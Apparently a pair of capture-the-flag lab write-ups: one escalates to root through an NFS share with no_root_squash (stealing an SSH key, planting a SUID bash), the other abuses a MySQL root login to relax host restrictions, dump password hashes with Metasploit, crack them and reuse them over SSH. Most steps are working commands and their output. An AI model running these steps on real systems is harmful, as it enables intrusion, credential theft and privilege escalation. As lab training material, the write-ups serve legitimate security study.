# NFS

# 🧾 NFS Exploitation → Root (no_root_squash)

## 🎯 Objective

Gain root access by abusing misconfigured NFS share.

---

## 🔍 1. Initial Scan

```bash
nmap -p- --min-rate 5000 -T4 -n -Pn <IP>
```

### Found:

- `111` → rpcbind
    
- `2049` → NFS
    

👉 Indicates NFS is in use

---

## 📡 2. Enumerate NFS Shares

```bash
showmount -e <IP>
```

### Output:

```bash
/home *
```

👉 `/home` is shared to everyone

---

## 📂 3. Mount the Share

```bash
mkdir /tmp/mount
sudo mount -t nfs -o vers=3,nolock <IP>:/home /tmp/mount
```

---

## 🔎 4. Enumerate Files

```bash
ls -la /tmp/mount
```

### Found:

- `/home/cappucino`
    
- `.ssh/` directory
    

---

## 🔑 5. Initial Foothold (SSH Key Theft)

```bash
cd /tmp/mount/cappucino/.ssh
cat id_rsa > id_rsa
chmod 600 id_rsa
ssh -i id_rsa cappucino@<IP>
```

👉 Got user access

---

## 🔥 6. Check for no_root_squash

On Kali:

```bash
sudo touch /tmp/mount/test_root
ls -la /tmp/mount/test_root
```

### Result:

```bash
-rw-r--r-- 1 root root ...
```

👉 NFS misconfigured (**no_root_squash enabled**)

---

## 🚀 7. Privilege Escalation

### Create SUID bash (on Kali)

```bash
cp /bin/bash /tmp/mount/cappucino/bash
sudo chown root:root /tmp/mount/cappucino/bash
sudo chmod +s /tmp/mount/cappucino/bash
```

---

### Execute on target

```bash
~/bash -p
```

---

## 🎯 Result

```bash
whoami
root
```

---

# 🧠 Key Takeaways

- NFS + `no_root_squash` = **critical misconfiguration**
    
- Allows attacker to act as root on remote filesystem
    
- Easy path:
    
    1. Mount share
        
    2. Steal creds (optional)
        
    3. Drop SUID binary
        
    4. Execute → root
        

---

# ⚠️ Common Mistakes

- Mounting wrong path (`:share` ❌ vs `/home` ✅)
    
- Forgetting `-p` in bash
    
- Not setting owner to root
    
- Ignoring NFS during enumeration
    

---

# ⚡ One-Line Summary

> Exposed NFS → mounted `/home` → stole SSH key → confirmed `no_root_squash` → planted SUID bash → root shell



---
---



# SQL

---

## 🎯 Target

```
10.49.148.180
```

---

## 🔍 1. Port Enumeration

```
nmap -p- --min-rate 1000 10.49.148.180
```

### Result:

```
22/tcp    open  ssh3306/tcp  open  mysql33060/tcp open  mysqlx
```

👉 Attack surface:

- MySQL (primary entry)
- SSH (likely pivot)

---

## 🔐 2. Initial Access (MySQL)

### Problem:

- SSL enforced → connection fails

### Fix:

```
mysql -h 10.49.148.180 -u root -p --skip-ssl
```

✅ Logged in as **root**

---

## 🔎 3. Manual SQL Enumeration

## 3.1 Databases

```
SHOW DATABASES;
```

### Output:

```
information_schemamysqlperformance_schemasys
```

👉 No app DB → move to internal enum

---

## 3.2 Users (🔥 KEY STEP)

```
SELECT user, host FROM mysql.user;
```

### Output:

```
root   %carl   localhostdebian-sys-maint localhost...
```

👉 Findings:

- `root@%` → remote root access
- `carl@localhost` → **valid user but restricted**
- `carl` likely system user → SSH target

---

## 3.3 (Optional) Privileges

```
SHOW GRANTS FOR 'carl'@'localhost';
```

---

## 🔓 4. Exploitation (Host Restriction Bypass)

```
UPDATE mysql.user SET host='%' WHERE user='carl';FLUSH PRIVILEGES;
```

👉 Effect:

```
carl@%   ← remote login enabled
```

---

## 🔑 5. Validate Credentials

```
mysql -h 10.49.148.180 -u carl -p --skip-ssl
```

✅ Login works → password confirmed

---

## ⚡ 6. Metasploit Enumeration

---

## 6.1 Schema Dump (❌ Useless here)

```
use auxiliary/scanner/mysql/mysql_schemadumpset RHOSTS 10.49.148.180set USERNAME rootset PASSWORD <password>run
```

👉 Result:

- Only default DBs
- No creds / no flag

❌ Dead end

---

## 6.2 Hash Dump (🔥 Useful)

```
use auxiliary/scanner/mysql/mysql_hashdumpset RHOSTS 10.49.148.180set USERNAME rootset PASSWORD <password>run
```

### Output:

```
root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19carl:*EA031893AA21444B170FC2162A56978B8CEECE18debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
```

👉 What this means:

- MySQL password hashes extracted
- Can be cracked offline

---

## 🔓 Optional: Crack Hash

```
hashcat -m 300 -a 0 hashes.txt rockyou.txt
```

👉 (Not needed here because you already had creds)

---

## 🔁 7. Credential Reuse → SSH

```
ssh carl@10.49.148.180
```

👉 Use same password from MySQL

✅ Shell access gained

---

## 🏁 8. Flag

```
lscat MySQL.txt
```

```
THM{congratulations_you_got_the_mySQL_flag}
```

---

## ⚡ FINAL ATTACK CHAIN

```
Port scan  ↓MySQL login (root)  ↓SQL enum → find user "carl"  ↓Modify host restriction  ↓Login as carl (MySQL)  ↓Metasploit → dump hashes (optional)  ↓Reuse creds → SSH  ↓Shell access  ↓Read flag
```

---

# 🧠 KEY TAKEAWAYS

## 🔑 1. Always enumerate users

```
SELECT user, host FROM mysql.user;
```

👉 This is what gave you **carl**

---

## 🔓 2. Host restriction is exploitable

```
carl@localhost → not remote
```

👉 Fixable with root → easy win

---

## 🔁 3. Credential reuse is common

- DB creds = SSH creds
- Always try it

---

## ⚡ 4. Metasploit role

|Module|Value|
|---|---|
|mysql_schemadump|❌ useless here|
|mysql_hashdump|✅ good for offline cracking|

👉 Manual enum was **more important than Metasploit**

---

# 🧪 What You Could Also Try

- `SELECT @@version;` → version enum
- `SHOW GRANTS;` → privilege abuse
- FILE privilege → webshell
- UDF → command execution

---
